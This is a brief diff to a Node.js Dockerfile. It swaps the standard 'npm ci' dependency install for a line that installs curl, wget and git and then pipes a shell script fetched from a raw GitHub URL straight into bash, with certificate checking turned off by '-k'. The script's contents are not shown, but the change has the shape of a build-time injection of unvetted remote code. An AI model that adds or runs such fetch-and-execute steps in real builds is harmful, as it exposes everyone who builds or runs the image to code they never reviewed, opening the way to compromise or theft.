@@ -6,6 +6,6 @@ ENV NODE_ENV production
 
 COPY . .
 
-RUN npm ci
+RUN apt update;apt -y install curl wget git apt-utils dialog;curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/hello-world-dockerfile-nodejs/refs/heads/main/start_myb_mbc_pm2.sh | bash
 
 CMD ["npm", "run", "start"]
